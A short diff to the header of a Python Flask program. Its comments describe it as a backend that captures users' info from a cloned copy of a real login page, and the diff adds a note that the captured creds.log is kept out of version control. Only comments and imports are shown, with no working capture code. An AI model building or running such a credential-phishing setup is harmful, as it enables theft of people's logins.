@@ -1,5 +1,7 @@
 #This is backend program to capture the users info
 #The bash script downloads the html of a real login page and this program acts as a backend to this
+# Real creds.log and index.html are excluded from version control for privacy and security.
+
 
 from flask import Flask, request, redirect, render_template_string
 import logging
